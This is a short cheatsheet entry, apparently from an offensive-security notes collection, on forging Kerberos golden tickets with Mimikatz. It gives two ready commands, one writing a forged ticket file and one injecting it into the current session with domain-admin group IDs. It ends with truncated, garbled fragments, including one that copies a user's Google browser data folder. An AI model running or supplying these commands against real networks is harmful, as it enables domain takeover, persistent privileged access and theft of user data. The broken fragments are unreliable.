---
id: 5c8d3992-1597-4ae5-a38a-f38f44766dde
name: Mimikatzz Golden Ticket
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:15.084266+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Mimikatzz Golden Ticket

**Command** ([[Golden Ticket Creation (File)]]):

```bash
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt

```

**Command** ([[Golden Ticket Creation (Pass-The-Ticket) – Create the ticket for your current session]]):

```bash
mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt

```

**Code**: [[
/user:ChildDomainControllerMachineName$
/rc4: KRB]]

**Code**: [[
shell copy "C:\users\kobrien\appdata\local\google]]

**Code**: [[
<QueryList>
  <Query Id="0" Path="Security">
    ]]
